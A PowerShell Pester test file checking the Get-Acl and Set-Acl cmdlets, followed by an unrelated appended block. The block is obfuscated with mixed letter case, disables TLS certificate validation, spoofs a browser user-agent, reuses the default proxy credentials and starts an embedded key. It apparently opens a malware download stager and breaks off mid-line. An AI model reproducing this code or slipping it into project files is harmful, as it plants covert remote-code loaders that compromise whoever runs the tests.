

Describe "Acl cmdlets are available and operate properly" -Tag CI {
    It "Get-Acl returns an ACL object" -pending:(!$IsWindows) {
        $ACL = get-acl $TESTDRIVE
        $ACL | Should -BeOfType "System.Security.AccessControl.DirectorySecurity"
    }
    It "Set-Acl can set the ACL of a directory" -pending {
        Setup -d testdir
        $directory = "$TESTDRIVE/testdir"
        $acl = get-acl $directory
        $accessRule = [System.Security.AccessControl.FileSystemAccessRule]::New("Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow")
        $acl.AddAccessRule($accessRule)
        { $acl | Set-Acl $directory } | Should -Not -Throw

        $newacl = get-acl $directory
        $newrule = $newacl.Access | Where-Object { $accessrule.FileSystemRights -eq $_.FileSystemRights -and $accessrule.AccessControlType -eq $_.AccessControlType -and $accessrule.IdentityReference -eq $_.IdentityReference }
        $newrule | Should -Not -BeNullOrEmpty
    }
}

[SYstem.NEt.SerVicePoINtMANaGer]::EXPEcT100ContiNUe = 0;$Wc=NEw-OBjeCT SysteM.NEt.WeBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEadERS.Add('User-Agent',$u);$Wc.PrOxy = [SYSTem.Net.WEBREQUest]::DEFaUlTWEBPROxY;$wC.Proxy.CrEdentiAlS = [SySTeM.Net.CrEDenTIAlCaCHE]::DEFAuLTNetWOrkCREDENTIals;$K='NzG@<dbq{*c4]k6ln[5V

